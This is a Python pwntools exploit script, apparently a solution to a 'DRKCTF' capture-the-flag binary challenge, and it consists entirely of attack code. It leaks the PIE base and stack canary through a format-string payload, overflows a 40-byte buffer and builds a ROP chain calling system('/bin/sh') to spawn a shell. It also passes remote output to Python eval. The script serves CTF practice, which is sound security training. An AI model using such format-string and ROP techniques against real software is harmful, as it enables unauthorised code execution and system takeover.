from pwn import *

# p = remote("127.0.0.1",9999)
p = process('./attachment')
e = context.binary = ELF("./attachment")
context.update(arch='amd64', os='linux', log_level='debug')

p.recvuntil(b'token:')
payload = str('DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}')
p.sendline(payload)

p.recvline()
p.sendline(str(eval(p.recvline().decode().strip().split('=')[0].strip())))

p.recvuntil(b'gift:\n')
p.sendline(b'%13$p|%11$p|')

e.address = int(p.recvuntil(b'|').strip(b'|'), 16) - 0x2042
canary = int(p.recvuntil(b'|').strip(b'|'), 16)
log.info(f'PIE: {hex(e.address)}')
log.info(f'Canary: {hex(canary)}')

bin_sh = e.address + 0x3041
pop_rdi = e.address + 0x0000000000002072
payload = b'A' * 40
payload += p64(canary) + p64(0)
payload += p64(pop_rdi) + p64(bin_sh)
payload += p64(pop_rdi + 1)
payload += p64(e.plt['system'])
p.sendline(payload)
p.interactive()